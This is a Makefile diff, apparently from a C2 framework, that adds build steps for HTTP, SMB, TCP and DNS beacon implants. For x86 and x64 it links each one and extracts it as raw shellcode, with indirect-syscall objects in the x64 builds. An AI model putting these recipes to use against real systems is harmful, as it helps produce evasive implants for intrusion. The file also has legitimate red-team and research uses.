@@ -228,18 +228,42 @@ x86: $(HTTP_OBJECTS_X86) $(SMB_OBJECTS_X86) $(TCP_OBJECTS_X86) $(DNS_OBJECTS_X86
 	@rm -f $(WS_DIST_DIR)/ConnectorHTTP.x86.o $(WS_DIST_DIR)/ConnectorSMB.x86.o $(WS_DIST_DIR)/ConnectorTCP.x86.o $(WS_DIST_DIR)/ConnectorDNS.x86.o
 
 bin_x64: x64
-	@echo "    * Extracting x64 shellcode bins"
-	@# HTTP flavor example extraction
+	@echo "    * Extracting x64 shellcode bins (HTTP/SMB/TCP/DNS)"
+	@# HTTP
 	@$(CXX_X64) $(LFlags) -Wl,-T,$(BEACON_DIR)/Shellcode.ld -Wl,-e,AxAsmEntry -o $(HTTP_DIST_DIR)/beacon_http.x64.elf \
 		$(HTTP_DIST_DIR)/config.o $(HTTP_DIST_DIR)/ConnectorHTTP.x64.o $(HTTP_OBJECTS_X64) $(INDIRECT_SYSCALL_X64_OBJECTS) $(HTTP_DIST_DIR)/entry_exe.x64.o
 	@llvm-objcopy -O binary --only-section=.text $(HTTP_DIST_DIR)/beacon_http.x64.elf $(HTTP_DIST_DIR)/beacon_http.x64.bin
-	@# Similar for SMB, TCP, DNS... but let's start with HTTP for the prototype.
+	@# SMB
+	@$(CXX_X64) $(LFlags) -Wl,-T,$(BEACON_DIR)/Shellcode.ld -Wl,-e,AxAsmEntry -o $(SMB_DIST_DIR)/beacon_smb.x64.elf \
+		$(SMB_DIST_DIR)/config.o $(SMB_DIST_DIR)/ConnectorSMB.x64.o $(SMB_OBJECTS_X64) $(INDIRECT_SYSCALL_X64_OBJECTS) $(SMB_DIST_DIR)/entry_exe.x64.o
+	@llvm-objcopy -O binary --only-section=.text $(SMB_DIST_DIR)/beacon_smb.x64.elf $(SMB_DIST_DIR)/beacon_smb.x64.bin
+	@# TCP
+	@$(CXX_X64) $(LFlags) -Wl,-T,$(BEACON_DIR)/Shellcode.ld -Wl,-e,AxAsmEntry -o $(TCP_DIST_DIR)/beacon_tcp.x64.elf \
+		$(TCP_DIST_DIR)/config.o $(TCP_DIST_DIR)/ConnectorTCP.x64.o $(TCP_OBJECTS_X64) $(INDIRECT_SYSCALL_X64_OBJECTS) $(TCP_DIST_DIR)/entry_exe.x64.o
+	@llvm-objcopy -O binary --only-section=.text $(TCP_DIST_DIR)/beacon_tcp.x64.elf $(TCP_DIST_DIR)/beacon_tcp.x64.bin
+	@# DNS
+	@$(CXX_X64) $(LFlags) -Wl,-T,$(BEACON_DIR)/Shellcode.ld -Wl,-e,AxAsmEntry -o $(DNS_DIST_DIR)/beacon_dns.x64.elf \
+		$(DNS_DIST_DIR)/config.o $(DNS_DIST_DIR)/ConnectorDNS.x64.o $(DNS_OBJECTS_X64) $(INDIRECT_SYSCALL_X64_OBJECTS) $(DNS_DIST_DIR)/entry_exe.x64.o
+	@llvm-objcopy -O binary --only-section=.text $(DNS_DIST_DIR)/beacon_dns.x64.elf $(DNS_DIST_DIR)/beacon_dns.x64.bin
 
 bin_x86: x86
-	@echo "    * Extracting x86 shellcode bins"
+	@echo "    * Extracting x86 shellcode bins (HTTP/SMB/TCP/DNS)"
+	@# HTTP
 	@$(CXX_X86) $(LFlags) -Wl,-T,$(BEACON_DIR)/Shellcode.ld -Wl,-e,_AxAsmEntry -o $(HTTP_DIST_DIR)/beacon_http.x86.elf \
 		$(HTTP_DIST_DIR)/config.o $(HTTP_DIST_DIR)/ConnectorHTTP.x86.o $(HTTP_OBJECTS_X86) $(HTTP_DIST_DIR)/entry_exe.x86.o
 	@llvm-objcopy -O binary --only-section=.text $(HTTP_DIST_DIR)/beacon_http.x86.elf $(HTTP_DIST_DIR)/beacon_http.x86.bin
+	@# SMB
+	@$(CXX_X86) $(LFlags) -Wl,-T,$(BEACON_DIR)/Shellcode.ld -Wl,-e,_AxAsmEntry -o $(SMB_DIST_DIR)/beacon_smb.x86.elf \
+		$(SMB_DIST_DIR)/config.o $(SMB_DIST_DIR)/ConnectorSMB.x86.o $(SMB_OBJECTS_X86) $(SMB_DIST_DIR)/entry_exe.x86.o
+	@llvm-objcopy -O binary --only-section=.text $(SMB_DIST_DIR)/beacon_smb.x86.elf $(SMB_DIST_DIR)/beacon_smb.x86.bin
+	@# TCP
+	@$(CXX_X86) $(LFlags) -Wl,-T,$(BEACON_DIR)/Shellcode.ld -Wl,-e,_AxAsmEntry -o $(TCP_DIST_DIR)/beacon_tcp.x86.elf \
+		$(TCP_DIST_DIR)/config.o $(TCP_DIST_DIR)/ConnectorTCP.x86.o $(TCP_OBJECTS_X86) $(TCP_DIST_DIR)/entry_exe.x86.o
+	@llvm-objcopy -O binary --only-section=.text $(TCP_DIST_DIR)/beacon_tcp.x86.elf $(TCP_DIST_DIR)/beacon_tcp.x86.bin
+	@# DNS
+	@$(CXX_X86) $(LFlags) -Wl,-T,$(BEACON_DIR)/Shellcode.ld -Wl,-e,_AxAsmEntry -o $(DNS_DIST_DIR)/beacon_dns.x86.elf \
+		$(DNS_DIST_DIR)/config.o $(DNS_DIST_DIR)/ConnectorDNS.x86.o $(DNS_OBJECTS_X86) $(DNS_DIST_DIR)/entry_exe.x86.o
+	@llvm-objcopy -O binary --only-section=.text $(DNS_DIST_DIR)/beacon_dns.x86.elf $(DNS_DIST_DIR)/beacon_dns.x86.bin
 
 # crt.cpp: Intel-syntax inline asm only — -masm=intel must be local (not in COMMON_FLAGS).
 # -fno-ms-extensions: Clang + -fms-extensions declares MSVC _alloca(void*) which clashes with our naked void _alloca(void).
